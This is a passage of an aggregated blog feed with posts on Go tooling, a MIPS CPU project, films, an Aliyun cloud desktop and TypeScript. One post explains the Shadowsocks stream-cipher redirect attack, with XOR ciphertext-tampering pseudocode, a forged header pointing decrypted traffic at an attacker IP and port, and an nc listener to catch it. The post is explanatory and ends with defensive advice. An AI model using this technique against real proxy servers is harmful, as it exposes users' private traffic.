)</code></pre><p>最后测了一下，VSCode 插件的各种功能（自动导入、格式化、跳转、调试）都没有什么问题，这就算是大功告成了。至于用起来具体怎么样，还有没有其它的坑，可能得等过一段时间才能知道了。</p><h1>参考资料</h1><ul><li><a href="https://github.com/golang/go/issues/32762#issuecomment-518828774">x/tools/gopls: failure to import package · Issue #32762 · golang/go</a></li><li><a href="https://stackoverflow.com/a/52124448">vgo - How do I resolve &quot;cannot find module for path X&quot; importing a local Go module? - Stack Overflow</a></li></ul>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/</id>
        <title><![CDATA[[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0]]></title>
        <updated>2020-02-16T07:31:33+08:00</updated>
        <link href="https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/"/>
        <content type="text/html" src="https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/"><![CDATA[<img src="https://images.unsplash.com/photo-1555589228-135c25ae8cf5?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0"><p>The CS undergraduate programme at <a href="https://nuaa.edu.cn/">NUAA</a> includes a (compulsory) Computer Organization course for this (4th) semester that requires implementing a MIPS CPU on the <a href="http://www.loongson.cn/index.html">Loongson</a> <a href="http://www.loongson.cn/news/company/628.html">development kit</a>, which is essentially a FPGA board + various useful modules.</p><p>As shown below, the suggested design is a classical 5-stage pipelined architecture:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/02/--2020-02-16--2.39.51.png" class="kg-image" alt="[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0"><figcaption>Suggested basic 5-stage pipeline</figcaption></figure><p>But it's boring to write "yet another" CPU that implements only the simplest structures. So I decided to extend the design a bit, and build a <a href="https://en.wikipedia.org/wiki/Superscalar_processor">superscalar</a> <a href="https://en.wikipedia.org/wiki/Out-of-order_execution">OoO</a> architecture from the ground up.</p><p>During the next few months I will post my experience as a series of posts both here and on WeChat. <a href="https://invariant.me/subscribe/">Subscribe</a> to stay updated!</p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html</id>
        <title><![CDATA[Redirect attack - Shadowsocks 流密码的不安全因素]]></title>
        <updated>2020-02-14T18:18:00+08:00</updated>
        <link href="https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html"/>
        <content type="text/html" src="https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html"><![CDATA[<p>Shadowsocks 是一款陪伴无数玩家多年的科学上网工具，但是近年来随着墙的日益增高，一些 Shadowsocks 流量已经可以被很好的识别出来，然后就是——“同志，你梯子塌了”。</p><p>虽然“协议可以被识别”已经众所周知，但我们依旧认为，Shadowsocks 的加密做的不错，中间人应当破解不出明文信息。</p><p>然而，晚上看到的一篇 <a href="https://github.com/edwardz246003/shadowsocks/blob/master/Redirect%20attack%20on%20Shadowsocks%20stream%20ciphers.pdf">文章</a>，稍稍动摇了一下我对 Shadowsocks 数据安全的信心，更让我重新审视了一下流密码的安全性。之前我在做安全方面的科普的时候，我总会提到“ECB 是不安全的”，但现在发现，其它的一些流密码也不一定安全，因为它们没有保证数据的完整性，因此存在数据被篡改的可能性。</p><blockquote><p>Shadowsocks 如果配置得当，还是比较安全的，或者至少可以让目前的破解方法没有用武之地。如果看完本文后依旧不放心，可以使用其它的科学上网工具。</p><p>本文的一些图片引用自维基百科，可能需要科学地观看。</p></blockquote><h1>一些基本概念</h1><p>考虑到可能有些同学没有密码学的基础，也对 Shadowsocks 的协议不是很了解，这里就简单的介绍一下。如果您已经有足够的知识，可以 <a href="#toc-link-5">跳到下一节</a>。</p><h2>流密码</h2><p>相信不少人都听说过 AES 之类的对称加密算法，但并没有了解的那么细致。例如什么是 IV？什么是基于数据块的加密？</p><p>事实上，AES 算法本体并不是为了处理无限长度的字符串而设计的，它一次只能处理 16 个字节（不管是 <code>AES-128</code> 还是 <code>AES-256</code>），我们管这 16 个字节叫做一个“数据块”，AES 就是一个基于数据块的加密算法。对于这一缺陷，可以用这样一种思路：先将明文切割成若干个数据块，对于每个块用 AES 做加密，再把每个加密后的块拼起来。</p><p>是不是很简单？其实这就是 ECB 模式。使用这个思路的 <code>AES-256</code> 算法被称为 <code>AES-256-ECB</code>。由于 16 字节对于一些数据来说实在是太小，很容易出现大量重复的块。例如有这样一张图片：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg" alt="Original image" title="Original image"></p><p>大家都知道这是一只小企鹅，我们用 ECB 加密一下再看看：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Tux_ecb.jpg" alt="Encrypted using ECB mode" title="Encrypted using ECB mode"></p><p>应该依旧能看出来图中是刚才那只小企鹅。ECB 模式无法隐藏原文的特征，请大家尽量不要使用。</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" alt="Electronic Codebook (ECB) mode encryption" title="Electronic Codebook (ECB) mode encryption"></p><p>有一些改良的方法，例如除了密码以外，再提供一个初始向量 <code>IV</code> 作为第 0 个数据块，在加密第 i 个块之前，先将明文跟上一个块的加密结果异或一下，即：</p><pre><code class="lang-text">Cipher[0] = IV
Cipher[i] = Encrypt(Plain[i] ^ Cipher[i - 1])</code></pre><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/CBC_encryption.svg/601px-CBC_encryption.svg.png" alt="Cipher Block Chaining (CBC) mode encryption" title="Cipher Block Chaining (CBC) mode encryption"></p><p>这种方式会比刚才的 ECB 安全得多。</p><p>还有其它的一些方式，所有的这些方式（包括 ECB）统称为“流密码”。一开始的那张小企鹅，用 ECB 以外的方式加密之后是这样的，已经完全看不出是什么了：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/a/a0/Tux_secure.jpg" alt="Modes other than ECB result in pseudo-randomness" title="Modes other than ECB result in pseudo-randomness"></p><h2>中间人攻击</h2><p>中间人攻击是个比较好玩的东西，假设攻击者利用一些方法（比如用一个钓鱼热点）让受害者发出的数据包走到了自己这里，那么攻击者就可以查看或者修改数据包的内容。就好像小明在课上给小红传纸条，本来写的是“我喜欢你”，但在经过小亮的时候，小亮用自己的纸条替换了他们的，上面写着“滚犊子吧”，可见中间人攻击对我们的影响有多大。</p><blockquote><p>注：在课上传纸条是不好的行为，小朋友们不要模仿。</p></blockquote><p>大家在日常生活中最常经历的中间人攻击，可能是在访问某些 HTTP 网站的时候，突然弹出一个“宽带到期需要续费”的通知。这种中间人攻击是一些无良运营商干的，不过我们更习惯把它叫做“流量劫持”。</p><h2>数据完整性</h2><p>这一段就偷个懒，直接摘抄百度百科了（有删改）：</p><blockquote><p>完整性是信息安全的三个基本要点之一，指用户、进程或者硬件组件具有能力，能够验证所发送或传送的东西的准确性，并且进程或硬件组件不会被以任何方式改变。</p></blockquote><p>翻译成白话就是：能保证数据在传输过程中不被篡改，小红收到的纸条内容跟小明传出去的一模一样。</p><ul><li>大家听说过的 ECC 内存纠错算法就能保证数据完整性，它可以发现内存数据被篡改（例如遭受了高能粒子冲击或硬件的部分损坏），并通过一些算法尽量恢复被损坏的部分；</li><li>HTTPS 中的数字签名也是一种保证数据完整性的方法，它可以发现传输的数据被篡改（例如中间人攻击），并且立即停止数据传输，以防止用户或服务器因为接收到虚假数据而遭受损失。</li></ul><h2>Shadowsocks 协议基础</h2><p>虽然 Shadowsocks 使用的底层协议是 SOCKS5，但对于本文而言，底层的 SOCKS5 并不是重点，我们只需要关注 Shadowsocks 的客户端与服务器之间是如何传输数据的。</p><p>根据官方文档所说，客户端向服务器发送的数据，一开始是流密码的 <code>IV</code>（也就是说，<code>IV</code> 由客户端生成，并直接扔进数据包中），之后就是一段加密数据，它的明文格式是这样的：</p><pre><code class="lang-text">[目标地址][数据]</code></pre><p>其中数据可以是任意长度；至于目标地址，Shadowsocks 用的是 SOCKS5 的表示法：</p><pre><code class="lang-text">[1 字节类型][主机名][2 字节端口]</code></pre><p>其中，类型是 1 字节的枚举值：</p><ul><li>0x01：主机名是 IPv4 地址；</li><li>0x03：主机名是变长字符串，首字节表示长度（最大 255），后面是数据；</li><li>0x04：主机名是 IPv6 地址。</li></ul><p>一次代理的过程如下：</p><ol><li>客户端将这些数据加密后发到服务器；</li><li>服务器收到后将其解密，会得到 <code>[1 字节类型][主机名][2 字节端口][数据]</code>；</li><li>服务器会将数据部分直接发送给 <code>主机名:端口</code>；</li><li>服务器将主机返回的数据直接使用同样的算法加密（如果加密算法用了流密码，则会生成并使用一个新的 <code>IV</code>，并将其放在包的最前面），发送给客户端；</li><li>客户端解密后即可得到主机返回的数据。</li></ol><h1>Shadowsocks + 流密码的不安全因素</h1><p>回到一开始说的那篇文章上，作者的发现是：如果攻击者抓到了一个 Shadowsocks 服务器返回的包，并且已知数据部分的开头七个字节，那么有可能在不知道密码的情况下，利用那个 Shadowsocks 服务器来解出包的绝大部分内容（最多损失 16 字节）。</p><p>作者的思路是这样的：</p><p>假设有一台 Shadowsocks 服务器，攻击者通过嗅探或其它方式抓到了这个 Shadowsocks 服务器返回的一个包。</p><p>为了知道明文内容，攻击者要么暴力破解密码（随着大家安全意识的提升，这已经几乎不可行了），要么想办法利用这台 Shadowsocks 服务器帮忙解密。</p><p>作者选择了后者，即想办法把这个包变成客户端发的包，让服务器解密后代理到自己指定的服务器，这被称为 <code>Redirect attack</code>。</p><p>上一节说到，Shadowsocks 客户端发的包格式（明文状态下）是 <code>[1 字节类型][主机名][2 字节端口][数据]</code>。如果攻击者可以利用加密算法的缺陷来篡改明文数据，就可以把主机名改成攻击者的服务器地址，Shadowsocks 服务器就会以为客户端想访问攻击者的服务器，于是就把解密后的包中的数据部分发了过去。</p><p>先考虑如何篡改数据。假设这台 Shadowsocks 服务器的加密算法使用的是 <code>AES-256-CFB</code>，那么解密的方式如维基百科所述是这样的：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/CFB_decryption.svg/601px-CFB_decryption.svg.png" alt="Cipher Feedback (CFB) mode decryption" title="Cipher Feedback (CFB) mode decryption"></p><p>其中 <code>IV</code>、每一块 Ciphertext 和 Plaintext 长度都是 16 字节。</p><p>作者发现，<code>key</code> 是不变的，<code>IV</code> 也可以重用服务器返回包中的那个，那么如果只修改第一块 Ciphertext，那么<strong>只有前两块 Plaintext 会改变</strong>，更重要的是，由于第一块 Plaintext 就是第一块 Ciphertext 跟某个串 A 的异或值，那么攻击者完全可以<strong>通过修改第一块 Ciphertext 的值来控制第一块 Plaintext</strong>！具体方法如下：</p><p>假设当前的第一块 Ciphertext 是 <code>c1</code>，第一块 Plaintext 是 <code>p1</code>，<code>IV</code> 做了一系列 whatever 的运算得到的结果是 <code>a</code>，那么：</p><pre><code class="lang-text">已知 a ^ c1 == p1
那么 a ^ c1 ^ X == p1 ^ X
根据异或的结合律
可得 a ^ (c1 ^ X) == (p1 ^ X)
也就是说，攻击者对 c1 做的异或操作，会完完全全反映在 p1 上

假设最终让 p1 变成了 q1，我们可以认为
已有 p1 ^ X == q1，将两边同时异或 p1
可得 p1 ^ X ^ p1 == q1 ^ p1
由于异或的性质，左边的两个 p1 抵消
可得 X == q1 ^ p1</code></pre><p>攻击者需要做的就是将 <code>c1 ^= (q1 ^ p1)</code>。但这里有一个问题，我们并不能知道具体的 <code>p1</code> 是什么！不过还好，它是明文数据的一部分，在上网的过程中，总有些协议的头几个字节是固定的，例如 HTTP 协议。</p><p>在 21 世纪的第三个十年，大家应该早就切换成 HTTP 1.1 了，因此返回的数据包一开始一定是 8 个字节 <code>HTTP/1.1</code>。攻击者能否将 TA 的主机地址压缩到这么小呢？毕竟除掉 1 字节类型和 2 字节端口以外，可用空间只有 5 字节了。</p><p>对于绝大部分攻击者来说，不可能拿到不超过 5 字节的域名，因此只能考虑 IPv4 了，而且如果用 IPv4 的话，甚至只需要总共 7 个字节！举个例子：</p><pre><code class="lang-text">01 c0 a8 01 03 12 12
-- ----------- -----</code></pre><p>划线的三部分分别代表了：使用 IPv4 协议、地址是 192.168.1.3，端口是 4626。</p><p>那么我们完全可以令：</p><pre><code class="lang-python">p1 = 'HTTP/1.'
q1 = '\x01\xc0\xa8\x01\x03\x12\x12'
new_c_part = c1[0:7] ^ p1 ^ q1</code></pre><p>用这个 7 字节的 <code>new_c_part</code> 替换掉之前 <code>c1</code> 的前 7 个字节，然后直接将替换后的整个包发送到刚才的 Shadowsocks 服务器。</p><p>Shadowsocks 服务器尝试解密，解密后发现明文是这样的：</p><pre><code class="lang-text">01 c0 a8 01 03 12 12 XX XX XX XX XX XX XX XX XX</code></pre><p>服务器会认为这是一个合法的客户端请求，因此将后面的一串 <code>XX</code>（明文数据）按照前 7 个字节的要求，转发到了 <code>192.168.1.3:4626</code>。</p><p>攻击者早就在这儿坐等了，方法非常简单，只需要用 <code>nc</code> 启动一个端口监听即可：</p><pre><code class="lang-text">$ nc -l -p 4626</code></pre><p>由于攻击者修改了 <code>c1</code>，而 <code>c1</code> 在 CFB 模式中又用来解密 <code>p2</code>，因此收到的 <code>p2</code> 这 16 个字节应该是乱码。攻击者最终可以还原出 <code>p2</code> 以外的所有数据。论文中的命令行截图也说明了这点，获取到的数据的第一个字节是之前包的明文的第 8 个字节（前 7 个是 <code>HTTP/1.</code>），然后有 9 个字节是正确的，之后 16 个字节是乱码，再之后是完全正确的：</p><pre><code class="lang-text">1 304 Not???????????????? Sat, 26 Jan 2019 07:15:21 GMT
Connection: close
Via: 1.1 varnish
Cache-Control: max-age=600
ETag: W/&quot;5c45d22a-127&quot;
Expires: Sat, 26 Jan 2019 06:59:41 GMT
Age: 0
....</code></pre><p>作者给出的防御措施是：</p><ul><li>禁用 shadowsocks-py、shadowsocks-go、go-shadowsocks2、shadowsocks-nodejs</li><li>只用 shadowsocks-libev，并且只使用 AEAD 加密</li></ul><p>原因如下：shadowsocks-libev 的实现很久之前就已经禁止了 <code>IV</code> 重用，可以在一定程度上防止这种攻击；只要加密算法带有 AEAD 特性，那么数据就无法被篡改，本文的攻击方式也是无效的。</p><h1>对大众的影响</h1><p>虽然文章中只列举了 HTTP 协议和 CFB 模式的例子，但理论上来说，所有头部 7 个字节已知的协议和所有类似流密码的组合，都可以被这种方法攻击。你不能保证你科学上的网总是 HTTPS，即使是 HTTPS，如果是国内网站，当某些不可抗力获取了其证书之后，你的 TLS 流量总是会被解密的。</p><p>不过有一些值得欣慰的地方：</p><p>由于墙的逐渐升高，大家已经逐渐意识到“只有加密是不行的”了，因此纷纷改用带有混淆功能的科学上网工具。由于攻击者无法得知混淆的参数（甚至不知道哪个流量是梯子的流量），因此这个方法不再起作用了。</p><p>目前大部分科学上网工具已经禁用了旧的加密算法，甚至强制只让使用带有 GCM 或者 Poly1305 的加密算法，这些算法有严格的 AEAD 特性，可以极大保证数据安全。TLS 1.3 强制使用 AEAD 也在某些程度上为它的安全性做了担保。</p><p>如果你还在用 Shadowsocks 或其衍生工具，并且依旧使用普通的流密码来加密，那么请立即听从作者给出的防御措施，为了你的服务器，也为了你自己。</p><h1>参考资料</h1><ul><li><a href="https://github.com/edwardz246003/shadowsocks">edwardz246003/shadowsocks: Redirect attack on Shadowsocks stream ciphers</a></li><li><a href="https://shadowsocks.org/en/spec/Protocol.html">Shadowsocks - Protocol</a></li><li><a href="https://shadowsocks.org/en/spec/Stream-Ciphers.html">Shadowsocks - Stream Ciphers</a></li><li><a href="https://toutiao.io/posts/5fo90o/preview">Shadowsocks 原理详解</a></li><li><a href="https://printempw.github.io/why-do-shadowsocks-deprecate-ota/">为何 shadowsocks 要弃用一次性验证 (OTA) - PRIN BLOG</a></li><li><a href="https://and-rev.blogspot.com/2016/09/shadowsocks.html">Shadowsocks 的定制和“不安全性”的分析 ~ and-rev</a></li><li><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">Block cipher mode of operation - Wikipedia</a></li><li><a href="https://baike.baidu.com/item/%E5%AE%8C%E6%95%B4%E6%80%A7/949221">完整性（信息安全的三个基本要点之一）_百度百科</a></li></ul><h1>Update 2020-02-15</h1><p>添加了对 <code>IV</code> 重用相关的补充。</p>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/version-2/</id>
        <title><![CDATA[Version 2]]></title>
        <updated>2020-02-14T14:56:07+08:00</updated>
        <link href="https://invariant.me/version-2/"/>
        <content type="text/html" src="https://invariant.me/version-2/"><![CDATA[<img src="https://images.unsplash.com/photo-1530714457710-6bf1899c1d32?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Version 2"><p>I'm migrating and restarting my blog, which is previously at <a href="https://mnotes.me">https://mnotes.me</a> .</p><p>Take a look at the <a href="https://invariant.me/about/">About</a> page or <a href="https://invariant.me/subscribe/">subscribe</a> now!</p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/408</id>
        <title><![CDATA[那些年的运动（观《朝阳沟》有感）]]></title>
        <updated>2020-02-11T09:34:26+08:00</updated>
        <link href="https://www.suruifu.com/posts/408"/>
        <content type="text/html" src="https://www.suruifu.com/posts/408"><![CDATA[<h3>关于戏曲文化</h3>
<p>与其说是戏曲，我更愿意称其为“中国电影”。爷爷奶奶会比较喜欢这个东西，很多年轻人会对之嗤之以鼻。而豫剧《朝阳沟》则是一个那个年代的经典，之所以这样，更多还是政治因素罢了。<br />
* 节奏欢快，不熟各种流行音乐，自成一家，别具风韵<br />
* 说话太慢，开二倍速还是觉得慢，我平常是很少开二倍速的<br />
* 故事情节很少，但各种表现却很到位</p>
<h3>关于电影内容</h3>
<p>家里长辈讲并没有人思想觉悟高到想要在农村奋斗一百年，整个剧不过就是一个文化宣传片而已，因此也就没有那么多需要思考的东西了。</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/</id>
        <title><![CDATA[使用阿里云 ECS 搭建廉价的高性能云桌面]]></title>
        <updated>2020-02-09T11:01:20+08:00</updated>
        <link href="https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/"><![CDATA[<blockquote><p>要想读懂本文，你需要：</p><ol><li>了解阿里云等云服务的基本 WEB 界面操作；</li><li>了解 Windows 操作系统的中阶操作；</li><li>了解基础的软件开发术语。</li></ol></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文面向的是需要使用高性能计算设备，但是身边只有低性能PC机的群体。最近由于 NCP 疫情，出不了门，返回不了工作地，想必不少人的高性能计算设备（好电脑）没带回家，但是，肯定也有人跟我一样，受不了笔记本电脑的龟速。</p><p>我的配置需求是，能够流畅运行安装多个插件的 VSCode、能够同时打开数十个 Firefox 标签页、能够快速完成 node 项目构建。但是我身边只有一台五年前的 intel NUC (i3-4010U, 4GB RAM)。</p><p>在详细了解了各大云服务商的云计算平台后，个人排除了华为云（弹性计算服务价格较高、云桌面售罄）、腾讯云（云计算服务类别过少）、天翼云（云桌面需要安装指定 APP 且性能不满足要求），决定使用阿里云的云计算服务。</p><h2 id="使用阿里云初步搭建云桌面"><a href="#使用阿里云初步搭建云桌面" class="headerlink" title="使用阿里云初步搭建云桌面"></a>使用阿里云初步搭建云桌面</h2><p>经过权衡，我决定使用阿里云 ESC “抢占式实例”付费模式下的“突发性能实例”。为什么这么选？</p><p>因为没钱……</p><p>开玩笑的。我觉得这是我需求下的合理选择方式。为什么选择“抢占式实例”？首先，我们复工的时间还是个未知数，而且可能随时就不想用这个云桌面了。“抢占式实例”是按量付费的一种，也就是，用多长时间给多少钱。并且，相对于按量付费，有相当大的折扣。<strong>“抢占式实例”的最大问题在于，这是竞价模式。也就是说，当别人出价比你高的时候，或者阿里云供给紧张而你又给钱给得不够的时候，它会自动帮你释放。我了解的是，在释放前5分钟，阿里云会有提醒。</strong>为了尽量避免实例被自动释放，我选择了“使用自动出价”，也就是说，系统会每小时自动判断当前时间该实例的价格，并选择一个高于市场均价的价格进行付费。<strong>但是，这并不是万无一失，阿里云在供给紧张的时候，仍然会将实例释放。</strong>所以，在处理重要数据时，应该随时备份。我的处理方法是，随时将代码提交到我的 Git 仓库。</p><p><img src="https://img.vvzero.com/ih/2020/02/09/ea3d50f39b198.png" alt="Snipaste_2020-02-09_17-32-20.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/df1fabf212984.png" alt="Snipaste_2020-02-09_17-34-24.png"></p><p>如果要保证不会被释放，建议使用包年包月制。</p><p>为什么使用“突发性能实例”？因为个人电脑与服务器不同。个人电脑不会时时刻刻占用大量 CPU，CPU使用率是离散化的，所以 CPU 的使用积分，我觉得是用不完，25% 的使用基线，完全够用。</p><p><img src="https://img.vvzero.com/ih/2020/02/09/d74c0622ec620.png" alt="Snipaste_2020-02-09_17-34-05.png"></p><p>哎，目前好像国内也只有阿里云能做出“抢占式实例”和“突发性能实例”。</p><p>其他的配置就简单了，区域选择靠近你的（不同地区的价格好像差别挺大），镜像选择 Windows Server，另外，SSD 是很关键的，我觉得现在已经没有多少人能忍受机械硬盘的龟速了。</p><p><img src="https://img.vvzero.com/ih/2020/02/09/6ae75caa75c6a.png" alt="Snipaste_2020-02-09_18-03-26.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/cbe75edc3c797.png" alt="Snipaste_2020-02-09_17-36-25.png"></p><p>在下一个页面配置网络，为了保证远程桌面流畅，按使用流量计费，带宽拉满！</p><p><img src="https://img.vvzero.com/ih/2020/02/09/2c112190ea447.png" alt="Snipaste_2020-02-09_17-45-57.png"></p><p>最终，我的配置如下：</p><ul><li>4核16GB，25% 平均CPU 计算性能；</li><li>100Mbps 按流量付费网络；</li><li>80GB SSD；</li><li>Windows Server 2019 数据中心版；</li></ul><p>这样的话，实例价格为 0.412 元每小时（我选的是上海区的，其他区的可能更便宜，在深夜、早上也会更便宜），流量费用为 0.8 元每 GB。算一算，一天大概要 10 元，一个月大概要 300 元，是不是还是有点贵？没关系，继续看。</p><p><img src="https://img.vvzero.com/ih/2020/02/09/ecfef72872df3.png" alt="Snipaste_2020-02-09_17-36-50.png"></p><h2 id="价格的进一步优化"><a href="#价格的进一步优化" class="headerlink" title="价格的进一步优化"></a>价格的进一步优化</h2><p>现在我已经启动了这个实例：</p><p><img src="https://img.vvzero.com/ih/2020/02/09/3ea24c1929367.png" alt="Snipaste_2020-02-09_18-21-04.png"></p><p>我还想更便宜。</p><h3 id="与基友合租一台机器"><a href="#与基友合租一台机器" class="headerlink" title="与基友合租一台机器"></a>与基友合租一台机器</h3><p>我想你一定不可能一天24小时都在用它，用它的时候也一定不会一直占满 CPU。关键是，我们这是 Windows Server，跟家庭版、专业版、企业版什么的都不一样，它支持多个用户同时登陆！所以，我觉得，如果有信任的人选，完全可以合租。</p><h3 id="关机时选择“停机不计费”"><a href="#关机时选择“停机不计费”" class="headerlink" title="关机时选择“停机不计费”"></a>关机时选择“停机不计费”</h3><p>阿里云真的是神奇的存在，在 ECS 管理界面，选择停机，竟然可以停机不收费！</p><p><img src="https://img.vvzero.com/ih/2020/02/09/28437c5fae934.png" alt="图片1.png"></p><p>实际上也不是完全不收费，硬盘和弹性公网 IP 仍然是收费的。但是，与停机后仍然保留CPU、内存相比，价格大幅降低。也就是说，我们在每天晚上，完全可以关机并选择不收费，可以节约一大笔。如果想要一直使用同一个 IP，可以选择绑定弹性公网 IP。</p><h3 id="依据个人需求选择实例规格"><a href="#依据个人需求选择实例规格" class="headerlink" title="依据个人需求选择实例规格"></a>依据个人需求选择实例规格</h3><p>我觉得，可能 8GB 内存已经够我用了，另外，青岛区的实例好像每小时能更便宜一毛钱……</p><h2 id="云桌面体验"><a href="#云桌面体验" class="headerlink" title="云桌面体验"></a>云桌面体验</h2><p>在体验之前，再确保一下：该实例网络安全组，需要放通 3389 端口（TCP 和 UDP 都要放通）。</p><p>打开本地的远程桌面客户端试试吧！</p><p><img src="https://img.vvzero.com/ih/2020/02/09/b4629c62b4373.png" alt="Snipaste_2020-02-09_18-38-25.png"></p><p>网络方面，我是江苏电信网络，连接上海区的 ECS，延迟很小，可以忽略，而且画质很清晰，暂时没有什么画面卡顿。至于下行网络，由于这是阿里云的专线，比家用运营商网络好太多，下载速度嗖嗖的，不管国内外。</p><p>计算性能方面，在我本地机器上，VSCode 的 Python 插件，进行一次文件错误扫描需要 5 秒左右，而这台云桌面，只要 1 秒。</p><p>操作系统方面，Windows Server 比 Windows PC 简洁很多，没有乱七八糟的服务，但也没有缺少日常开发所需的重要组件。可能会有点不一样，但是如果出问题，一般能很快解决。比如我在安装 Python 时出错，Google 一下便知要直接以管理员身份打开。</p><p>以下截图自我的云桌面。</p><p><img src="https://img.vvzero.com/ih/2020/02/09/d3b52ba297968.png" alt="Screenshot _1_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/e9ae18b879037.png" alt="Screenshot _3_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/9f2c0741b0057.png" alt="Screenshot _4_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/8109324fabb58.png" alt="Screenshot _2_.png"></p><h3 id="提高体验的可选项"><a href="#提高体验的可选项" class="headerlink" title="提高体验的可选项"></a>提高体验的可选项</h3><ol><li>关闭 Windows 的过渡动画，这在远程桌面上会导致卡顿，且会消耗大量的流量费；</li><li>安全起见，重新创建一个管理员用户并禁用 Administrator 用户；</li><li>用好各种云同步功能，比如 Git 仓库、浏览器云同步、云盘等。</li></ol><h2 id="实测价格"><a href="#实测价格" class="headerlink" title="实测价格"></a>实测价格</h2><p>我正常使用了一天，晚上停机不收费，消费如下：</p><p><img src="https://img.vvzero.com/ih/2020/02/09/176c67e7015fa.png" alt="Snipaste_2020-02-09_18-54-30.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/140f26bd1d962.png" alt="Snipaste_2020-02-09_18-55-07.png"></p><p>可见，我一天大致消费5元。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>确实不是很贵，可行性也很高。假如有模型渲染需求，甚至可以绑定个显卡（</p><p>抢占式实例也不是很可怕吧？我的实例目前没被回收。</p><p>另外，有人想跟我合租吗？</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/394</id>
        <title><![CDATA[平（观《9 Songs》有感）]]></title>
        <updated>2020-02-07T05:39:56+08:00</updated>
        <link href="https://www.suruifu.com/posts/394"/>
        <content type="text/html" src="https://www.suruifu.com/posts/394"><![CDATA[<p><img src="https://s.suruifu.com/www/2020/02/lisa_matt_3.png" alt="" /><br />
说起性，这个剧太平淡。“别看这个，没什么意思”。从性的角度出发，太平淡了。<br />
<img src="https://s.suruifu.com/www/2020/02/lisa_matt_1.png" alt="" /><br />
说起爱，这个剧太平凡。整个剧看下来不是在制造感动，而是在歌颂平凡。<br />
<img src="https://s.suruifu.com/www/2020/02/lisa.png" alt="" /><br />
两个人都不想要long goodbye，Matt 却违约了，他选择了回忆，这是一个多长时间的离别呀。<br />
<img src="https://s.suruifu.com/www/2020/02/matt.png" alt="" /><br />
Now she&#8217;s gone, love burns inside me.</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/typescript-type-system-and-functional-programming.html</id>
        <title><![CDATA[TypeScript 类型系统与函数式编程]]></title>
        <updated>2020-02-04T12:37:00+08:00</updated>
        <link href="https://blog.rexskz.info/typescript-type-system-and-functional-programming.html"/>
        <content type="text/html" src="https://blog.rexskz.info/typescript-type-system-and-functional-programming.html"><![CDATA[<h1>背景</h1><p>接触 TypeScript 已经有一段时间了，这期间写过一些复杂的类型（例如 <a href="https://blog.rexskz.info/issues-in-typescript-vue-component-lib.html#toc-link-6">这篇文章</a>），我开始意识到：TypeScript 的类型系统写起来就像函数式编程一样。去年某天，一个同事给我发了个链接，里面讲的是“TypeScript 类型系统的图灵完备”，里面的一些内容我还在努力理解到可以分享的程度，但一些代码差不多可以说明 TypeScript 类型系统跟函数式编程的思想非常接近了。</p><h1>前期知识</h1><ul><li>掌握 TypeScript 的 <a href="https://www.typescriptlang.org/docs/handbook/basic-types.html">基本类型</a>，相信大家都了解；</li><li>掌握 TypeScript 的 <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html">高级类型</a> 和 <a href="https://www.typescriptlang.org/docs/handbook/generics.html">泛型</a>；</li><li>非常熟悉 <code>extends</code> 和 <code>infer</code> 的使用；</li><li>“函数式编程”的概念，相信大家都或多或少从公众号里面听到过。</li></ul><blockquote><p>文中接下来所有跟 TypeScript 相关的部分，除非特殊说明，否则“函数”、“参数”均为新的概念，而非 TypeScript 中的“函数类型”、“参数列表”。</p></blockquote><h1>免责声明</h1><ol><li>本文只是讲述一个“理论上”可行的东西，并非推荐大家日常这样写。事实上，类型标注应当在适当精确的情况下尽可能简洁（参考 